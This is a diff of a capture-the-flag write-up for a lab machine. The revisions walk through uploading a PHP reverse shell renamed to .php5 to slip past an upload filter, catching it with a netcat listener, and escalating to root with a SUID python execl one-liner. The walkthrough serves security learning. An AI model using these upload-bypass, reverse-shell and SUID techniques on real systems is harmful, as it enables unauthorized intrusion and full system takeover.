@@ -54,11 +54,18 @@ Starting gobuster in directory enumeration mode
 ### We can uplosd files here. Let's upload a web-shell to get a shell.
 
 you can use this php reverse shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
-### first, i tried uploading a test file with .php extension to see if it would be accepted. Unfortunately, it was rejected.
+### File upload: failed attempt then success
+  ### 1. First attempt — upload .php web-shell
+
 ![alt text](https://github.com/user-attachments/assets/7e1f6514-0c75-4a63-bf98-11c06715efe3)
 
- ### After that, I tried changing the extension to .php5, and fortunately, that was successful.
+I tried uploading a standard PHP reverse shell file with a .php extension. Upload was rejected by the server.
+         The server likely blocks .php uploads (extension filtering) or checks MIME/type.
+     
+ #### 2. Second attempt — change extension to
 ![alt text](https://github.com/user-attachments/assets/c2960494-7412-4211-a981-891a5846ead8)
+
+I renamed the file to shell.php5 and uploaded again. Upload succeeded and the file was accessible/executable. Why this worked: Some servers accept alternative PHP extensions (e.g., .php5, .phtml) or have a whitelist of allowed extensions. In this case .php5 was treated as executable by the server while .php was filtered.
 
 ## /uploads Directory
 
@@ -69,7 +76,7 @@ Start a netcat listener from your attack machine.
 ```bash
 $ nc -lvnp 1234
 ```
-You have to visit the PHP URL in order to initiate the connection.
+Visit the uploaded PHP URL `http://10.10.123.179/uploads/php-reverse-shell.php5` to trigger the reverse shell.
 ![alt text](https://github.com/user-attachments/assets/514e04dc-e33f-4758-883a-887dcb79be50)
 
 ## User flag
@@ -89,17 +96,19 @@ $ find -type f -perm -4000 2>/dev/null
 ```
 ![alt text](https://github.com/user-attachments/assets/4204c297-7d2f-4ba9-b9b8-8c616c4c5f2f)
 
-we find the weird file. know we go to [GTFobins](https://gtfobins.github.io/gtfobins/python/#suid) and look for methods to exploit SUID in Python
+A SUID binary (e.g., python) was discovered.
+
+### Exploiting SUID python (GTFOBins method)
+I looked up [GTFoBins](https://gtfobins.github.io/gtfobins/python/#suid) for `Python` SUID techniques and used the following:
 
 ```bash
 bash-5.0$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 # id
-id
 uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 # whoami
-whoami
 root
 ```
 ![alt text](https://github.com/user-attachments/assets/ea1cf006-5fde-4b50-8faa-74df105dec72)
+
+**Explanation:** Executing the SUID python binary allowed spawning a shell with the effective UID of the binary owner (root). Using os.execl("/bin/sh", "sh", "-p") preserves the elevated privileges and spawns a root shell.
 
